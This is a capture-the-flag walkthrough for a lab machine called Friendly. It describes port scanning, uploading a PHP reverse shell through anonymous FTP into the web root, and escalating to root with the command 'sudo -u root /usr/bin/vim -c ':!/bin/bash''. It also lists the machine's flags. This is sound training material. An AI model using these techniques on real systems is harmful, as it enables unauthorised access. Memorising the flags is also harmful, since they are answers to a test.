+++
title = "Friendly - Walkthrough"
date = "2026-07-16"
author = "nvru"
description = "Walkthrough for the Friendly machine."
tags = [
  "ctf",
  "walkthrough",
  "linux",
  "ftp",
  "apache",
  "anonymous-ftp",
  "file-upload",
  "sudo",
  "vim",
  "privilege-escalation",
   "easy"
]
draft = false
+++

## Overview

- **Attacker IP:** `10.10.10.2`
- **Target Machine IP:** `10.10.10.25`

The objective was to enumerate the target, identify exposed services, gain initial access through an anonymous FTP file upload, and escalate privileges by abusing a misconfigured sudo rule that allowed execution of Vim as root.

![Machine information](/images/hmv/friendly/vm.png)

---

## Port Scanning

### RustScan

```bash
rustscan -a 10.10.10.25 -- -sC -sV -A -oA nmap/rust
```

### Results

```text
PORT   STATE SERVICE REASON  VERSION
21/tcp open  ftp     syn-ack ProFTPD
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--   1 root     root        10725 Feb 23  2023 index.html

80/tcp open  http    syn-ack Apache httpd 2.4.54 ((Debian))
|_http-server-header: Apache/2.4.54 (Debian)
| http-methods:
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-title: Apache2 Debian Default Page: It works
```

Only two services were exposed: FTP on port **21** and Apache HTTP on port **80**. Since anonymous FTP access was enabled, it became the primary focus of enumeration.

---

## Enumeration

### Apache HTTP

Browsing to the web server displayed the default Apache page, indicating that no custom application was being served.

![Apache default page](/images/hmv/friendly/http.png)

---

### FTP Enumeration

The Nmap scan revealed that anonymous FTP login was allowed and that an `index.html` file was available.

After logging into the FTP server using the `anonymous` account, I downloaded the file.

![FTP index file](/images/hmv/friendly/ftp_index.png)

To verify whether this file was the same one being served by Apache, I also downloaded the webpage directly.

![Downloaded web page](/images/hmv/friendly/wget_index.png)

Comparing both files confirmed they were identical.

```bash
diff index.html index.html.1
```

![File comparison](/images/hmv/friendly/diff.png)

This confirmed that the FTP directory mapped directly to the web root, meaning uploaded files would be accessible through the web server.

---

### Anonymous FTP File Upload

Since anonymous users had write permissions, I uploaded the PentestMonkey PHP reverse shell to the FTP server.

After testing, I removed unnecessary files to keep the FTP directory clean.

To delete uploaded files through FTP:

```bash
mdelete <filename>
```

![Uploading reverse shell](/images/hmv/friendly/upload_shell.png)

Accessing the uploaded shell through the web server successfully triggered a reverse shell as the `www-data` user.

![Reverse shell](/images/hmv/friendly/rev_shell.png)

---

## Initial Access

The initial foothold was obtained by uploading a PHP reverse shell through the anonymous FTP service and executing it via Apache.

The shell was received as:

```text
www-data
```

---

## Privilege Escalation

### www-data → root

The first step was checking sudo permissions.

```bash
sudo -l
```

![Sudo permissions](/images/hmv/friendly/sudo_perm.png)

The `www-data` user was allowed to execute:

```text
/usr/bin/vim
```

as any user, including **root**, without supplying a password.

This is a dangerous sudo misconfiguration because Vim allows execution of arbitrary shell commands.

Using Vim, a root shell was obtained with:

```bash
sudo -u root /usr/bin/vim -c ':!/bin/bash'
```

![Privilege escalation](/images/hmv/friendly/exp_vim.png)

---

### Locating the Root Flag

Attempting to read `/root/root.txt` produced the following message:

```text
Not yet! Find root.txt.
```

![Fake root flag](/images/hmv/friendly/fake_root.png)

Searching the filesystem located the actual flag.

```bash
find / -type f -name root.txt 2>/dev/null
```

![Finding root flag](/images/hmv/friendly/find_flag.png)

---

## Credentials

```text
No credentials were required.
```

---

## Flags

```text
user:b8cff8c9008e1c98a1f2937b4475acd6

root:66b5c58f3e83aff307441714d3e28d2f
```
